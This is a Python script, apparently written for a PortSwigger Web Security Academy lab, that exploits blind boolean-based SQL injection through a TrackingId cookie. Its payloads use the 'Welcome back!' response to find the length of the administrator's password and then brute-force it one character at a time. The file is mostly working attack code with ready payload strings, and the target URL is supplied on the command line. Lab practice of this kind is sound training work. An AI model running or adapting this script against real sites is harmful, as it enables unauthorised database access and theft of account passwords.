#!/usr/bin/env python3

import requests
from requests.models import Response
import urllib3
from sys import argv
from urllib import parse
import string




'''
Comments

Morning if it's morning,
Evening if it's evening 

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

' and SELECT IF(ASCII(SUBSTRING('SQL Tutorial', 1, 1))>100, "yes",  False) --
BinarySearchPayload = " 'AND ( SELECT 'a' FROM users WHERE username='administrator' IF(LENGTH(password))>{NUM}, "yes",  False) ) --"
LowPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
HighPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
EquelPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={num})='a
LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
crakPayload = 'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}

def tryPayload(TargetUrl):
    while True:
        payload = input("Enter input: ")
        if payload == "stop":
            break
        else:
            TargetUrl = TargetUrl+payload
            statusCode = sendRequest(TargetUrl)
            print(statusCode[1])


'''

# diable disable_warnings if thir is proxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# change it manuale 
SiteCookies = {'TrackingId': 'bXlY0udfavmY0We8' , 'session':'E4ogKB42ysYD3N4LI4iNU41zK2icoTJE'}


# ================================= Functions ================================= #

# return list [ text of respone , status coe ]
# defualt value their is no cookies or proxies
def sendRequest(TargetUrl , proxies=None , cookies=None):
    try :
        result = requests.get(TargetUrl ,  cookies=cookies , proxies=None, verify=False )
        return [result.text, result.status_code]
    except:
        print("error")

# Url encode the payload 
def encodePayload(payload):
    return parse.quote(payload)


# Find the length of the password by brute Forceing
def BruteForceFindLength(TargetUrl, payload, infectedCookie ,maxLength=50):

    infectedCookieValue = SiteCookies.get(infectedCookie , "'")
    for i in range(1, maxLength+1): # no zero password length , add 1 to reach the given number 
        # Edit the value of the cookie to set the payload in it 
        # Payload must have {passLength} to format it 
        # Updated the Cookie to add the payload to it
        SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(passLength=i))
        
        # send the request with cookies after puting the dynamic payload 
        responseStatus = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
        
        if responseStatus : 
            # print status code of the response
            print(responseStatus[1],end=" ")
            # Refactor this part - make a fun to check for a dynamic word and return true if it's in
            if "Welcome back!" in responseStatus[0]:
                print("Moer than: " , i) # This means the condition is True && the password length is bigger than i
            elif responseStatus[1] != 200:
                print("\nText\n" , responseStatus[0])
                break
            else:
                print("Done password Length is: " , i)
                break    
        else:
            print("Error - Status code: ",responseStatus[1], "\nText:\n", responseStatus[0] )



def BruteForcePassword(TargetUrl, passwordLength ,infectedCookie, wordlist, payload ):
    crackedPasswod = []
    infectedCookieValue = SiteCookies.get(infectedCookie , "'")
    for i in range(1,passwordLength+1): # To crack the last index
        for passValue in wordlist:
            # Edit the value of the cookie to set the payload in it 
            SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(indexOfletter=i,letter=passValue))
            
            # send the request with cookies after puting the dynamic payload 
            responseStatus = sendRequest(TargetUrl , cookies=SiteCookies , proxies=proxies)
            
            if responseStatus : 
                # print status code of the response
                print(responseStatus[1],end=" ")
                # Refactor this part - make a fun to check for a dynamic word and return true if it's in
                if "Welcome back!" in responseStatus[0]:
                    crackedPasswod.append(passValue) # This means the condition is True
                    print("Index:", i, "is:" , passValue , sep=" ")
                    break
                elif responseStatus[1] != 200:
                    print("\nText\n" , responseStatus[0])
                    print("".join(str(i) for i in crackedPasswod))
                    exit()
                else:
                    print("Index:" , i, "is Not:", passValue, sep=" ")           
            else:
                print("Error - Status code: ",responseStatus[1], "\nText:\n", responseStatus[0] )

    password = "".join(str(i) for i in crackedPasswod)
    print(password)


def binarySearch(array , num , low , high):
    
    BinarySearchLengthPayload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{num})='a".format(operator="=")
    BinarySearchCrakPayload = "'AND (SELECT SUBSTRING(password,{indexOfletter},1) FROM users WHERE username='administrator'){operator}'{letter}".format(operator="=")
    # Repeat until the pointers low and high meet each other
    while low <= high:

        mid = low + (high - low) // 2

        if array[mid] == num:
            return mid
        elif array[mid] < num:
            low = mid + 1
        else:
            high = mid - 1
    return -1




# ================================= Functions ================================= #


# ================================= Main ================================= #


if __name__ == '__main__':

    numberOfArguments = len(argv)
    #if numberOfArguments == 1:
    #    print("-length [ Password Length] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
    if numberOfArguments == 4:
        TargetUrl=argv[1]
    else:
        print("Traget Url + options\n-length [ Password Length ] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
        exit()

    crakPayload = "'AND (SELECT SUBSTRING(password,{indexOfletter},1) FROM users WHERE username='administrator')='{letter}"
    LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{passLength})='a"

    if argv[2] == "-length":
        Maxlength= int(argv[3])
        BruteForceFindLength(TargetUrl, LengthPayload , infectedCookie="TrackingId" ,maxLength=Maxlength)
    elif argv[2] == "-crack":
        # None till i make argv
        PasswordLength = int(argv[3])
        Wordlist = string.ascii_letters + string.digits
        BruteForcePassword(TargetUrl, passwordLength=PasswordLength, infectedCookie="TrackingId" ,wordlist=Wordlist, payload=crakPayload)
    else:
        print("-length [ Password Length] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
